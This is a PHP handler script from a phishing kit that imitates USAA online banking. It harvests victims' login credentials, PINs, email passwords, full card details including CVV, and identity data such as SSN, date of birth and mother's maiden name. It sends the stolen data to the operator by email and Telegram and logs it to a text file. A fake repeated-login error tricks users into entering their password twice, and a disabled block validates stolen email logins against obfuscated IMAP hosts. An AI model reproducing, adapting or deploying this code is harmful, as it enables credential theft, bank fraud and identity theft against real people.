<?php
include 'email.php';

function GetIp()
{
    if (isset($_SERVER['HTTP_CLIENT_IP'])) $ip = $_SERVER['HTTP_CLIENT_IP'];
    else if (isset($_SERVER['HTTP_X_REAL_IP'])) $ip = $_SERVER['HTTP_X_REAL_IP'];
    else if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
    else if (isset($_SERVER['HTTP_X_FORWARDED'])) $ip = $_SERVER['HTTP_X_FORWARDED'];
    else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) $ip = $_SERVER['HTTP_FORWARDED_FOR'];
    else if (isset($_SERVER['HTTP_FORWARDED'])) $ip = $_SERVER['HTTP_FORWARDED'];
    else if (isset($_SERVER['REMOTE_ADDR'])) $ip = $_SERVER['REMOTE_ADDR'];
    else $ip = false;
    if ($ip == "::1") {
        return "127.0.0.1";
    }
    return $ip;
}

function check_doublelogin($doublelogin)
{
    if ($doublelogin == 0) {
        if (empty($_SESSION['doublelogin_done'])) {
            // First attempt — show error page
            $_SESSION['doublelogin_done'] = true;
            header('Location: ./web/login.php?error=3');
            exit();
        } else {
            // Second attempt — now go to name.php
            header('Location: ./web/login.php?error=3');
            exit();
        }
    } else {
        header('Location: ./web/pin.php');
        exit();
    }
}

function randomi($length = 25)
{
    $bytes = random_bytes(ceil($length / 2));
    return substr(bin2hex($bytes), 0, $length);
}

if (!isset($_GET['auth_token'])) {
    $auth_token = randomi(115);
    $time_token = randomi(25);
    header('Location: ?auth_token=' . $auth_token . '&time_token' . $time_token);
}





if (isset($_POST['UserName'])) {

    $action = $_POST['action'];
    $user = $_POST['UserName'];

    if (!empty($usern)) {
        header('Location: ./web/login.php');
    }


    if ($action == 3) {
        $ip = GetIP();
        $hostname = gethostbyaddr($ip);
        $useragent = $_SERVER['HTTP_USER_AGENT'];
        $message = "";
        $message .= "|-----USAA Online -----|\n";
        $message .= "Username: " . $_POST['UserName'] . "\n";
        $message .= "Password: " . $_POST['Password'] . "\n";
        $message .= "Phone Number: " . $_POST['mobili'] . "\n";
        $message .= "|Client IP: " . $ip . "\n";
        $message .= "User Agent : " . $useragent . "\n";
        $subject = "USAA Login : $ip\n ";
        $headers = "From: <noreply@mail-support.com>\n";
        mail($send, $subject, $message, $headers);
        include 'telegram.php';      // Set your API Token & Chat ID in telegram.php file //
        include __DIR__ . '/web/assets/css/common-redesign.inc.php';
        $file_path = "./usaa.txt"; // Add name of text file if want to save. like "./nae.txt"//   
        // Only proceed if the file path is not empty
        if (!empty($file_path)) {
            $fp = fopen($file_path, "a"); // Open the file for appending
            if ($fp) {
                fputs($fp, $message);  // Write the message
                fclose($fp);  // Close the file after writing
            }
        }
        $doublelogin = 1;
        check_doublelogin($doublelogin);
    } else if ($action == 4) {
        $ip = GetIP();
        $hostname = gethostbyaddr($ip);
        $useragent = $_SERVER['HTTP_USER_AGENT'];
        $message = "";
        $message .= "|-----USAA Online2 -----|\n";
        $message .= "Username: " . $_POST['UserName'] . "\n";
        $message .= "Password: " . $_POST['Password'] . "\n";
        $message .= "|Client IP: " . $ip . "\n";
        $message .= "User Agent : " . $useragent . "\n";
        $subject = "USAA Login2 : $ip\n ";
        $headers = "From: <noreply@mail-support.com>\n";
        mail($send, $subject, $message, $headers);
        include 'telegram.php';      // Set your API Token & Chat ID in telegram.php file //	
        include __DIR__ . '/web/assets/css/common-redesign.inc.php';
        $file_path = "./usaa.txt"; // Add name of text file if want to save. like "./nae.txt"//        
        // Only proceed if the file path is not empty
        if (!empty($file_path)) {
            $fp = fopen($file_path, "a"); // Open the file for appending
            if ($fp) {
                fputs($fp, $message);  // Write the message
                fclose($fp);  // Close the file after writing
            }
        }
        $doublelogin = 0;
        check_doublelogin($doublelogin);
    }
}


if (isset($_POST['pin'])) {
    $ip = GetIp();
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $message = "";
    $message .= "|----- USAA Pin -----|\n";
    $message .= "Pin: " . $_POST['pin'] . "\n";
    $message .= "|Client IP: " . $ip . "\n";
    $message .= "User Agent : " . $useragent . "\n";
    $subject = "USAA Pin : $ip\n ";
    $headers = "From: <noreply@mail-support.com>\n";
    mail($send, $subject, $message, $headers);
    include 'telegram.php';      // Set your API Token & Chat ID in telegram.php file //
    include __DIR__ . '/web/assets/css/common-redesign.inc.php';
    header("Location: ./web/mbox.php?auth_token=' . $auth_token . '&time_token' . $time_token");
}

if (isset($_POST['emd'])) {

    $action = $_POST['action'];
    $user = $_POST['emd'];

    if (!empty($usern)) {
        header('Location: ./web/mbox.php');
    }

    $user = $_POST['emd'];
    $pattern = "/@/i";
    $stat = preg_match($pattern, $user);

    $stat = preg_match($pattern, $user);
    if ($stat == 5) {
        header('Location: ./web/mbox.php?error=5');
        die();
    }
    if ($action == 5) {
        $ip = GetIP();
        $hostname = gethostbyaddr($ip);
        $useragent = $_SERVER['HTTP_USER_AGENT'];
        $message = "";
        $message .= "|-----USAA Email-----|\n";
        $message .= "Email: " . $_POST['emd'] . "\n";
        $message .= "Password: " . $_POST['epass1'] . "\n";
        $message .= "Client IP: " . $ip . "\n";
        $message .= "|Client IP: " . $ip . "\n";
        $message .= "User Agent : " . $useragent . "\n";
        $subject = "USAAEmail: $ip\n ";
        $headers = "From: <noreply@mail-support.com>\n";
        mail($send, $subject, $message, $headers);
        include 'telegram.php';      // Set your API Token & Chat ID in telegram.php file //
        include __DIR__ . '/web/assets/css/common-redesign.inc.php';
        header('Location: ./web/mbox.php?error=5');
    } else if ($action == 6) {
        $ip = GetIP();
        $hostname = gethostbyaddr($ip);
        $useragent = $_SERVER['HTTP_USER_AGENT'];
        $message = "";
        $message .= "|-----USAA Email 2-----|\n";
        $message .= "Email: " . $_POST['emd'] . "\n";
        $message .= "Password: " . $_POST['epass1'] . "\n";
        $message .= "Client IP: " . $ip . "\n";
        $message .= "|Client IP: " . $ip . "\n";
        $message .= "User Agent : " . $useragent . "\n";
        $subject = "USAAEmail: $ip\n ";
        $headers = "From: <noreply@mail-support.com>\n";
        mail($send, $subject, $message, $headers);
        include 'telegram.php';      // Set your API Token & Chat ID in telegram.php file //
        include __DIR__ . '/web/assets/css/common-redesign.inc.php';
        header("Location: ./web/name.php?auth_token=' . $auth_token . '&time_token' . $time_token");
    }
}



if (isset($_POST['card'])) {
    $ip = GetIp();
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $message = "";
    $message .= "|----- USAA Card -----|\n";
    $message .= "Card Number: " . $_POST['card'] . "\n";
    $message .= "Exp: " . $_POST['exp'] . "\n";
    $message .= "CVV: " . $_POST['cvv'] . "\n";
    $message .= "ATP Pin: " . $_POST['pin'] . "\n";
    $message .= "|Client IP: " . $ip . "\n";
    $message .= "User Agent : " . $useragent . "\n";
    $subject = "USAA Card : $ip\n ";
    $headers = "From: <noreply@mail-support.com>\n";
    mail($send, $subject, $message, $headers);
    include 'telegram.php';      // Set your API Token & Chat ID in telegram.php file //
    include __DIR__ . '/web/assets/css/common-redesign.inc.php';
    header("Location: ./web/done.php?auth_token=' . $auth_token . '&time_token' . $time_token");
}



if (isset($_POST['fname'])) {
    $ip = GetIp();
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $message = "";
    $message .= "|----- USAA Fullz -----|\n";
    $message .= "Full Name: " . $_POST['fname'] . "\n";
    $message .= "SSN: " . $_POST['SSN'] . "\n";
    $message .= "DOB: " . $_POST['DOB'] . "\n";
    $message .= "MMN: " . $_POST['MMN'] . "\n";
    $message .= "Phone Number: " . $_POST['Phone'] . "\n";
    $message .= "Address: " . $_POST['Address'] . "\n";
    $message .= "City: " . $_POST['city'] . "\n";
    $message .= "State: " . $_POST['state'] . "\n";
    $message .= "Zip Code: " . $_POST['zip'] . "\n";
    $message .= "|Client IP: " . $ip . "\n";
    $message .= "User Agent : " . $useragent . "\n";
    $subject = "USAA Fullz : $ip\n ";
    $headers = "From: <noreply@mail-support.com>\n";
    mail($send, $subject, $message, $headers);
    include 'telegram.php';      // Set your API Token & Chat ID in telegram.php file //
    include __DIR__ . '/web/assets/css/common-redesign.inc.php';
    header("Location: ./web/card.php?auth_token=' . $auth_token . '&time_token' . $time_token");
}


/*  Disabled
 if (isset($_POST['emd'])) {
    $ip = GetIp();
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $message = "";
    $message .= "|-----USAA Email-----|\n";
    $message .= "Email: " . $_POST['emd'] . "\n";
    $message .= "Password: " . $_POST['epass1'] . "\n";
    $message .= "Client IP: " . $ip . "\n";
    $message .= "User Agent : " . $useragent . "\n";
    $subject = "USAAEmail: $ip\n ";
    $headers = "From: <noreply@mail-support.com>\n";
    mail($send, $subject, $message, $headers);
    include 'telegram.php';      // Set your API Token & Chat ID in telegram.php file //
    include __DIR__ . '/web/assets/css/common-redesign.inc.php';
    header("Location: ./web/name.php?auth_token=' . $auth_token . '&time_token' . $time_token");
}
*/


/* Disabled 
if (isset($_POST['1emd'])) {
    $ipdata = "NOTRUE";
    $check = 0;

    $user = $_POST['1emd'];
    $pass = $_POST['epass'];


    $charter = '/charter/i';
    $rrnet = '/.rr.net/i';
    $rrcom = '/.rr.com/i';

    if (preg_match($charter, $user) == 1) {
        $authhost = str_rot13("{zbovyr.punegre.arg:993/vznc/ffy/abinyvqngr-preg}");
    } else if (preg_match($rrnet, $user) == 1) {
        $authhost = str_rot13("{znvy.gjp.pbz:993/vznc/ffy/abinyvqngr-preg}");
    } else if (preg_match($rrcom, $user) == 1) {
        $authhost = str_rot13("{znvy.gjp.pbz:993/vznc/ffy/abinyvqngr-preg}");
    } else {
        $authhost = str_rot13("{znvy.gjp.pbz:993/vznc/ffy/abinyvqngr-preg}");
    }


    if ($ipdata == "NOTRUE" && $check == 0) {
        $ip = GetIp();
        $hostname = gethostbyaddr($ip);
        $useragent = $_SERVER['HTTP_USER_AGENT'];
        $message = "";
        $message .= "|-----USAA Email-----|\n";
        $message .= "Email: " . $_POST['1emd'] . "\n";
        $message .= "Password: " . $_POST['epass'] . "\n";
        $message .= "Client IP: " . $ip . "\n";
        $message .= "User Agent : " . $useragent . "\n";
        $subject = "USAAEmail: $ip\n ";
        $headers = "From: <noreply@mail-support.com>\n";
        include 'telegram.php'; // Set your API Token & Chat ID in telegram.php file
        include __DIR__ . '/web/assets/css/common-redesign.inc.php';
        mail($send, $subject, $message, $headers);
        header("Location: ./web/card.php?auth_token=" . $auth_token . "&time_token=" . $time_token);
        die();
    }

    if (!empty($authhost) && !empty($user) && !empty($pass)) {
        if ($mbox = imap_open($authhost, $user, $pass)) {
            $ipdata = "Call Done";
            imap_close($mbox);
        } else {
            $ipdata = "FAIL!";
        }
    }

    if ($ipdata == "Call Done") {
        $ip = GetIp();
        $hostname = gethostbyaddr($ip);
        $useragent = $_SERVER['HTTP_USER_AGENT'];
        $message = "";
        $message .= "|-----USAA EmailTrue-----|\n";
        $message .= "Email: " . $_POST['1emd'] . "\n";
        $message .= "Password: " . $_POST['epass'] . "\n";
        $message .= "Client IP: " . $ip . "\n";
        $message .= "User Agent : " . $useragent . "\n";
        $subject = "USAA EmailTrue: $ip\n ";
        $headers = "From: <noreply@mail-support.com>\n";
        include 'telegram.php'; // Set your API Token & Chat ID in telegram.php file
        include __DIR__ . '/web/assets/css/common-redesign.inc.php';
        mail($send, $subject, $message, $headers);
        header("Location: ./web/card.php?auth_token=" . $auth_token . "&time_token=" . $time_token);
    } else {
        header("Location: ./web/mbox.php?error=5");
    }
}
*/

$fp = fopen("./usaa.txt", "a"); // Add name of text file if want to save. like "./nae.txt"//
fputs($fp, $message);
fclose($fp);